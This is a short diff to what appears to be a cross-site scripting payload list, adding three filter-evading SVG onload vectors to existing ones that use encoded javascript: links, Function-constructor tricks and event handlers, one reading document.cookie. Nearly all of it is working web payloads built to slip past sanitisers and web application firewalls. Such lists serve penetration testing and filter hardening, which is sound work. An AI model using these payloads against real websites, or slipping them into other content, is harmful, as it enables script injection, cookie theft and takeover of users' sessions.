@@ -12,6 +12,9 @@
 <a href=java%26%23x0Dscript%26%230000058alert(document%26%230000046cookie%26%230000041>search
 test ‘-Function`self[‘a’\x2b’l’\x2b’e’\x2b’r’\x2b’t’]\x281\x29```-’
 test ‘-Function`self[‘a’+’l’+’e’+’r’+’t’](1)```-’
+JavaScript​:"<Svg/OnLoad​=alert%25%0A26lpar;1)>"
+:"\%0A74Svg/On%0ALoad=alert%25%0A26lpar;1%25%0A26rpar;>"
+"<!--><Svg+OnLoad%3dconfirm%3f.(%2fcypher😈%2f)<!--1")
 <a%2Fonmouseover%3D(confirm)(document.URL)>a
 <a href=javascript:origin>CLICK
 <audio controls onwaiting=alert(1)><source src=x type=x></audio>
